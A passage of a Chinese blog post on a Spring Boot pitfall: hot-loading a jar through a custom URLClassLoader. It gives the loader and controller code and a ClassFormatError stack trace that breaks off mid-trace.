      "content": "本文主要分析和解决Spring Boot中自定义URLClassLoader热加载jar时遇到的坑。 模拟场景是动态修改一个class文件后，访问web服务endpoint后立即反应出来。每次修改后的class文件打包为一个jar文件并通过我们自定义的ClassLoader加载。 自定义URLClassLoader加载jar 自定义ClassLoader package com.stone.jdk.demohotswap.classloader; import java.io.IOException; import java.net.JarURLConnection; import java.net.URL; import java.net.URLClassLoader; import java.net.URLConnection; import java.util.ArrayList; import java.util.List; /** 参考：https://blog.csdn.net/jianggujin/article/details/80536019 */ public class MyClassLoader extends URLClassLoader { private static boolean canCloseJar; private List&lt;JarURLConnection&gt; cachedJarFiles = new ArrayList&lt;&gt;(); static { // 1.7之后可以直接调用close方法关闭打开的jar， // 需要判断当前运行的环境是否支持close方法， // 如果不支持，需要缓存，避免卸载模块后无法删除jar try { URLClassLoader.class.getMethod(&quot;close&quot;); canCloseJar = true; } catch (Exception e) { canCloseJar = false; } } public MyClassLoader() { super(new URL[0], findParentClassLoader()); } private static ClassLoader findParentClassLoader() { ClassLoader parent = Thread.currentThread().getContextClassLoader(); System.out.println(&quot;context loader:&quot; + parent); if (parent != null) { parent = parent.getParent(); // use appClassLoader rather than LaunchedClassLoader } if (parent == null) { parent = ClassLoader.getSystemClassLoader(); } &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; } @Override public void addURL(URL url) { if (!canCloseJar) { try { // 打开并缓存文件url连接 URLConnection uc = url.openConnection(); if (uc instanceof JarURLConnection) { uc.setUseCaches(true); ((JarURLConnection) uc).getManifest(); cachedJarFiles.add((JarURLConnection) uc); } } catch (Exception e) { // ignore } } super.addURL(url); } @Override public void close() throws IOException { if (canCloseJar) { try { super.close(); } catch (IOException ioe) { // ignore } } else { for (JarURLConnection conn : cachedJarFiles) { conn.getJarFile().close(); &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cachedJarFiles&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } }  web服务 package com.stone.jdk.demohotswap; import com.stone.jdk.demohotswap.classloader.MyClassLoader; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.boot.builder.SpringApplicationBuilder; import org.springframework.boot.web.servlet.support.SpringBootServletInitializer; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import java.lang.reflect.Method; import java.net.JarURLConnection; import java.net.URL; import java.text.SimpleDateFormat; import java.util.Date; @SpringBootApplication @RestController public class DemoHotswapApplication extends SpringBootServletInitializer { //public class DemoHotswapApplication { private static final String PROTOCOL_HANDLER = &quot;java.protocol.handler.pkgs&quot;; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;SpringApplication&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DemoHotswapApplication&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SpringApplicationBuilder&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;configure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SpringApplicationBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sources&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DemoHotswapApplication&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@RequestMapping&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello Mr Swap!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@RequestMapping&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/swap&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;MyClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MyClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jarFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;jar:file:%s/%s!/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;test.jar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// reproduce BUG un-comment below line&lt;/span&gt;  &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jarUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jarFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// FIX bug un-comment below line&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// URL jarUrl = new URL(null, jarFile, new sun.net.www.protocol.jar.Handler());&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addURL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jarUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getURLs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Create a jar URL connection object&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;JarURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jarURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;JarURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;jarURLConnection:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jarURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handlers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getProperty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;PROTOCOL_HANDLER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;handlers:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handlers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NA&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;swapClass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;com.stone.jdk.demohotswap.swapClass.SwapMe&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plugin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;swapClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;swapClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plugin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;output:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s - %s&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SimpleDateFormat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yyyy-MM-dd HH:mm:ss.sss&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 热加载的类，注意这个类不要打包到测试的war包中。应该通过 jar cvf test.jar com/stone/jdk/demohotswap/swapClass/SwapMe.class 单独打包 package com.stone.jdk.demohotswap.swapClass; /** @Description: @author: donghua @date: 2019-09-22 */ public class SwapMe { public String hello() { return &quot;Swap Before!&quot;; //  return &quot;Swap After!&quot;; } } 问题描述 上面代码build成spring boot war包部署到独立的jetty服务器没有问题，（包括jetty runner方式、start.jar等）。但是用`java -jar demo.jar&quot;方式时出现java.lang.ClassFormatError。 org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.ClassFormatError: Truncated class file  at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1054) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) ~[javax.servlet-api-4.0.1.jar!/:4.0.1]  at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) ~[javax.servlet-api-4.0.1.jar!/:4.0.1]  at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:876) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1623) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.websocket.server.WebSocketUpgradeFilter.doFilter(WebSocketUpgradeFilter.java:214) ~[websocket-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:540) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:146) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548) ~[jetty-security-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:257) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610] at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1711) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:255) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1347) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:203) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:480) ~[jetty-servlet-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1678) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:201) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1249) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:144) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.Server.handle(Server.java:505) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:370) ~[jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:267) [jetty-server-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:305) 